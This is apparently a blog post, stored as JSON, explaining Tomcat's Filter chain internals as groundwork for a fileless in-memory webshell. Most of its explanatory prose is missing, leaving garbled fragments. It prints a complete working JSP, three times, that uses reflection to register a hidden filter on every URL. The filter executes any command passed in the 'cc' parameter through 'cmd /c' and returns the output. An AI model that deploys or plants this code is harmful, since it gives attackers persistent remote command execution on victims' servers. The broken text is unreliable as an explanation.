[https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)\n    \n    ```\n    \n\n\n\n```auto\n<%@ page import=\"org.apache.catalina.core.ApplicationContext\" %>\n<%@ page import=\"java.lang.reflect.Field\" %>\n<%@ page import=\"org.apache.catalina.core.StandardContext\" %>\n<%@ page import=\"java.util.Map\" %>\n<%@ page import=\"java.io.IOException\" %>\n<%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterDef\" %>\n<%@ page import=\"org.apache.tomcat.util.descriptor.web.FilterMap\" %>\n<%@ page import=\"java.lang.reflect.Constructor\" %>\n<%@ page import=\"org.apache.catalina.core.ApplicationFilterConfig\" %>\n<%@ page import=\"org.apache.catalina.Context\" %>\n<%@ page import=\"java.io.InputStream\" %>\n<%@ page import=\"java.io.ByteArrayOutputStream\" %>\n<%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\" pageEncoding=\"UTF-8\"%>\n\n<%\n    ServletContext servletContext = request.getSession().getServletContext();\n\n    Field appctx = servletContext.getClass().getDeclaredField(\"context\");\n    appctx.setAccessible(true);\n    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);\n\n    Field stdctx = applicationContext.getClass().getDeclaredField(\"context\");\n    stdctx.setAccessible(true);\n    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);\n\n    //filter\n    Filter filter=new Filter() {\n        @Override\n        public void init(FilterConfig filterConfig) throws ServletException {\n\n        }\n\n        @Override\n        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n            HttpServletRequest req = (HttpServletRequest) servletRequest;\n            if (req.getParameter(\"cc\") != null){\n                byte[] bytes = new byte[1024];\n                InputStream in = Runtime.getRuntime().exec(\"cmd /c\"+req.getParameter(\"cc\")).getInputStream();\n\n                ByteArrayOutputStream baos = new ByteArrayOutputStream();\n                byte[] b = new byte[1024];\n                int a = -1;\n\n                while ((a = in.read(b)) != -1) {\n                    baos.write(b, 0, a);\n                }\n                servletResponse.getWriter().write(new String(baos.toByteArray()));\n                return;\n            }\n            filterChain.doFilter(servletRequest,servletResponse);\n        }\n\n        @Override\n        public void destroy() {\n\n        }\n    };\n\n    //filter\n    String filtername=\"novic4\";\n    FilterDef filterDef=new FilterDef();\n    filterDef.setFilter(filter);\n    filterDef.setFilterName(filtername);\n    filterDef.setFilterClass(filter.getClass().getName());\n\n    //filterdeffilterdefs\n    standardContext.addFilterDef(filterDef);\n\n    //filterdeffilterconfig\n    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);\n    constructor.setAccessible(true);\n    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);\n\n    //filterMap\n    FilterMap filterMap = new FilterMap();\n    filterMap.addURLPattern(\"/*\");\n    filterMap.setFilterName(filtername);\n    // javax.servlet.DispatcherTypeservlet 3  Tomcat 7 Servlet 3\n    filterMap.setDispatcher(DispatcherType.REQUEST.name());\n\n    //filterMaps\n    standardContext.addFilterMapBefore(filterMap);\n\n    //filterconfigs\n    Field Configs = standardContext.getClass().getDeclaredField(\"filterConfigs\");\n    Configs.setAccessible(true);\n    Map filterConfigs = (Map) Configs.get(standardContext);\n    filterConfigs.put(filtername,filterConfig);\n    out.print(\"bingo\");\n%>\n```\n\n\n\n\n\n","slug":"TomcatFilter","published":1,"updated":"2024-04-17T08:43:01.339Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7ir000dh776fvvd1xl7","content":"<h2 id=\"Filter\"><a href=\"#Filter\" class=\"headerlink\" title=\"Filter\"></a>Filter</h2><p>FilterservletservletservletFilter <code>web.xml</code>Filter</p>\n<p>FilterFilterFilterservletFilterFilterchain</p>\n<h3 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h3><p>Filterdemo</p>\n<p>testfilter.java</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import javax.servlet.*;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\">public class testfilter implements Filter&#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\">        System.out.println(&quot;filter&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">        System.out.println(&quot;dofilter&quot;);</span><br><span class=\"line\">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>web.xml</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class=\"line\">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class=\"line\">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class=\"line\">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span><br><span class=\"line\">         version=&quot;4.0&quot;&gt;</span><br><span class=\"line\">    &lt;filter&gt;</span><br><span class=\"line\">        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;</span><br><span class=\"line\">        &lt;filter-class&gt;testfilter&lt;/filter-class&gt;</span><br><span class=\"line\">    &lt;/filter&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;filter-mapping&gt;</span><br><span class=\"line\">        &lt;filter-name&gt;testfilter&lt;/filter-name&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/filter&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/filter-mapping&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet&gt;</span><br><span class=\"line\">        &lt;!--servlet--&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;test&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;!--class--&gt;</span><br><span class=\"line\">        &lt;servlet-class&gt;test&lt;/servlet-class&gt;</span><br><span class=\"line\">    &lt;/servlet&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">    &lt;servlet-mapping&gt;</span><br><span class=\"line\">        &lt;servlet-name&gt;test&lt;/servlet-name&gt;</span><br><span class=\"line\">        &lt;!--url--&gt;</span><br><span class=\"line\">        &lt;url-pattern&gt;/test&lt;/url-pattern&gt;</span><br><span class=\"line\">    &lt;/servlet-mapping&gt;</span><br><span class=\"line\">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure>\n\n<p> <code>/filter</code></p>\n<p></p>\n<h3 id=\"Filter\"><a href=\"#Filter\" class=\"headerlink\" title=\"Filter\"></a>Filter</h3><p>from <a class=\"link\"   href=\"https://paper.seebug.org/1441/#tomcat\" >https://paper.seebug.org/1441/#tomcat<i class=\"fas fa-external-link-alt\"></i></a></p>\n<ul>\n<li><p><strong>Filter</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> Filter  Java  Filter javax.servlet.Filter init(Web  Filter  Filter  init )doFilter( Filter Servlet  Filter  doFilter )destory( Web  Filter )</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterChain</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> FilterChain  doFilter()  Filter  Filter.FilterFilterChain, FilterFilterChain</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">, Servlet Filter  Servlet Servlet  ServletContext  Filter  FilterConfig FilterConfig  FilterConfig  Filter  ServletContext  web.xml  Filter </span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>FilterDef</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterChain</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ApplicationFilterFactory</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>WebXml</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web.xml</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>ContextConfig</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>StandardContext</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">web(Context)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>StandardWrapperValve</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Wrapperservlet</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"Tomcat-Filter\"><a href=\"#Tomcat-Filter\" class=\"headerlink\" title=\"Tomcat Filter\"></a>Tomcat Filter</h3><p> <code>ContextConfig$configureContext</code>  <code>web.xml</code>  <code>WebXml</code> </p>\n<p> <code>StandardWrapperValve</code> </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure>\n\n<p> <code>filterchain</code>  <code>ApplicationFilterFactory$createFilterChain</code> </p>\n<p> <code>filterchain</code>  <code>StandardWrapper$getParent</code>  <code>Context</code> WEB <code>Context</code>  <code>findFilterMaps</code>  <code>filterMaps</code></p>\n<p><code>filterMaps</code>  <code>filterMap</code>  <code>filterMap</code>  filtername  url <code>filter</code> </p>\n<p><code>for</code>  <code>filterMaps</code>  <code>url</code>  <code>filterMap</code>  <code>urlPatterns</code>  <code>findFilterConfig</code>  <code>filtername</code>  <code>FilterConfig</code>  <code>addFilter</code>  <code>filterConfig</code>  <code>filterChain</code></p>\n<p> <code>addFilter</code>  <code>filterChain</code>  <code>filter</code>  <code>return</code></p>\n<p>n <code>filters</code>  <code>filters</code>  <code>filterChain</code>  <code>StandardWrapperValve</code>  <code>ApplicationFilterChain$doFilter</code></p>\n<p> <code>doFilter</code> </p>\n<p> <code>internalDoFilter</code> </p>\n<p> <code>filterConfig</code>  <code>filterConfig.getFilter()</code>  <code>filter</code>  <code>filter</code>  <code>doFilter</code>  Filter </p>\n<p></p>\n<ul>\n<li> <code>Context</code>  <code>filterMaps</code></li>\n<li> <code>urlPattern</code>  url  <code>filtername</code></li>\n<li> <code>filtername</code>  <code>FilterConfig</code></li>\n<li> <code>FilterConfig</code>  <code>filterChain</code></li>\n<li> <code>filterChain</code>  <code>internalDoFilter</code>  <code>FilterConfig</code></li>\n<li> <code>FiletrConfig</code>  <code>Filter</code>  <code>Filter</code>  <code>doFilter</code></li>\n</ul>\n<h2 id=\"filter\"><a href=\"#filter\" class=\"headerlink\" title=\"filter\"></a>filter</h2><p>filterdemo <code>filter</code> </p>\n<p> <code>filter</code>  <code>filterMaps</code>  <code>context</code> </p>\n<p> <code>context</code>  <code>filterMaps</code>  <code>filter</code> </p>\n<p> <code>context</code>  <code>StandardContext</code>  <code>filter</code> </p>\n<ul>\n<li>filterConfigs <code>filterConfig</code>  <code>HashMap</code>  <code>filterConfig</code>  <code>FilterDef</code>  <code>filter</code> </li>\n<li>filterDefs <code>FilterDef</code>  <code>HashMap</code> <strong>FilterDef</strong>url </li>\n<li>filterMaps <code>FilterMap</code>  <code>HashMap</code>  <code>FilterMap</code>  <code>FilterName</code>  <code>URLPattern</code></li>\n</ul>\n<p></p>\n<ul>\n<li> <code>filter</code></li>\n<li> <code>FilterDef</code>  <code>filter</code></li>\n<li> <code>FilterDef</code>  <code>FilterDefs</code>  <code>FilterConfig</code></li>\n<li> <code>filter</code>  <code>filterMap</code>  <code>filterMaps</code> ()</li>\n</ul>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//filter</span><br><span class=\"line\">        Filter filter=new Filter() &#123;</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">                HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class=\"line\">                if (req.getParameter(&quot;cc&quot;) != null)&#123;</span><br><span class=\"line\">                    byte[] bytes = new byte[1024];</span><br><span class=\"line\">                    InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                    ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                    byte[] b = new byte[1024];</span><br><span class=\"line\">                    int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                    while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                        baos.write(b, 0, a);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    servletResponse.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                    return;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        //filter</span><br><span class=\"line\">        String filtername=&quot;novic4&quot;;</span><br><span class=\"line\">        FilterDef filterDef=new FilterDef();</span><br><span class=\"line\">        filterDef.setFilter(filter);</span><br><span class=\"line\">        filterDef.setFilterName(filtername);</span><br><span class=\"line\">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">        //filterdeffilterdefs</span><br><span class=\"line\">        standardContext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">        //filterdeffilterconfig</span><br><span class=\"line\">        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class=\"line\">        constructor.setAccessible(true);</span><br><span class=\"line\">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">        //filterMap</span><br><span class=\"line\">        FilterMap filterMap = new FilterMap();</span><br><span class=\"line\">        filterMap.addURLPattern(&quot;/*&quot;);</span><br><span class=\"line\">        filterMap.setFilterName(filtername);</span><br><span class=\"line\">        // javax.servlet.DispatcherTypeservlet 3  Tomcat 7 Servlet 3</span><br><span class=\"line\">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class=\"line\"></span><br><span class=\"line\">        //filterMaps</span><br><span class=\"line\">        standardContext.addFilterMapBefore(filterMap);</span><br><span class=\"line\"></span><br><span class=\"line\">        //filterconfigs</span><br><span class=\"line\">        Field Configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class=\"line\">        Configs.setAccessible(true);</span><br><span class=\"line\">        Map filterConfigs = (Map) Configs.get(standardContext);</span><br><span class=\"line\">        filterConfigs.put(filtername,filterConfig);</span><br></pre></td></tr></table></figure>\n\n<p> <code>context</code>  <code>context</code>,</p>\n<ul>\n<li><p><strong> <code>servletcontext</code>  <code>StandardContext</code></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">webwebservletcontextweb</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">        // ApplicationContext  ServletContext </span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong><strong>Mbeancontext</strong></strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[https://paper.seebug.org/1441/#2mbeancontext](https://paper.seebug.org/1441/#2mbeancontext)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p><strong>StandardContext</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[https://zhuanlan.zhihu.com/p/114625962](https://zhuanlan.zhihu.com/p/114625962)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<p></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.util.Map&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.lang.reflect.Constructor&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;org.apache.catalina.Context&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page import=&quot;java.io.ByteArrayOutputStream&quot; %&gt;</span><br><span class=\"line\">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot; pageEncoding=&quot;UTF-8&quot;%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    ServletContext servletContext = request.getSession().getServletContext();</span><br><span class=\"line\"></span><br><span class=\"line\">    Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    appctx.setAccessible(true);</span><br><span class=\"line\">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class=\"line\">    stdctx.setAccessible(true);</span><br><span class=\"line\">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class=\"line\"></span><br><span class=\"line\">    //filter</span><br><span class=\"line\">    Filter filter=new Filter() &#123;</span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class=\"line\">            HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class=\"line\">            if (req.getParameter(&quot;cc&quot;) != null)&#123;</span><br><span class=\"line\">                byte[] bytes = new byte[1024];</span><br><span class=\"line\">                InputStream in = Runtime.getRuntime().exec(&quot;cmd /c&quot;+req.getParameter(&quot;cc&quot;)).getInputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">                ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class=\"line\">                byte[] b = new byte[1024];</span><br><span class=\"line\">                int a = -1;</span><br><span class=\"line\"></span><br><span class=\"line\">                while ((a = in.read(b)) != -1) &#123;</span><br><span class=\"line\">                    baos.write(b, 0, a);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                servletResponse.getWriter().write(new String(baos.toByteArray()));</span><br><span class=\"line\">                return;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        @Override</span><br><span class=\"line\">        public void destroy() &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    //filter</span><br><span class=\"line\">    String filtername=&quot;novic4&quot;;</span><br><span class=\"line\">    FilterDef filterDef=new FilterDef();</span><br><span class=\"line\">    filterDef.setFilter(filter);</span><br><span class=\"line\">    filterDef.setFilterName(filtername);</span><br><span class=\"line\">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class=\"line\"></span><br><span class=\"line\">    //filterdeffilterdefs</span><br><span class=\"line\">    standardContext.addFilterDef(filterDef);</span><br><span class=\"line\"></span><br><span class=\"line\">    //filterdeffilterconfig</span><br><span class=\"line\">    Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class=\"line\">    constructor.setAccessible(true);</span><br><span class=\"line\">    ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span 